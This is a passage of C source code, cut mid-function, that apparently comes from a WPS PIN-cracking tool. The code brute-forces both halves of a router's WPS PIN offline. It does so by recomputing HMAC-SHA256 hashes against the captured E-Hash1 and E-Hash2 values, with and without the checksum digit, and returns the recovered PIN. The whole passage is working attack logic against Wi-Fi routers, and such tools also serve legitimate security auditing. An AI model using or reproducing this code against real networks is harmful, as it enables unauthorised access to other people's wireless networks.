			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

		if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
			first_half++;
		} else {
			break;
		}
	}

	if (first_half < 10000) { /* First half found */
		uint_fast8_t checksum_digit;
		unsigned int c_second_half;

		/* Testing with checksum digit */
		while (second_half < 1000) {
			checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
			c_second_half = second_half * 10 + checksum_digit;
			uint_to_char_array(c_second_half, 4, s_pin);
			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
			memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

			if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
				second_half++;
			} else {
				second_half = c_second_half;
				found = 1;
				break;
			}
		}

		/* Testing without checksum digit */
		if (!found) {
			second_half = 0;

			while (second_half < 10000) {

				/* If already tested skip */
				if (wps_pin_valid(first_half * 10000 + second_half)) {
					second_half++;
					continue;
				}

				uint_to_char_array(second_half, 4, s_pin);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
				memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

				if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
					second_half++;
				} else {
					found = 1;
					break;
				}
			}
		}
	}

	free(buffer);
	free(result);

	*pin = first_half * 10000 + second_half;
	return !found; /* 0 success, 1 failure */
}
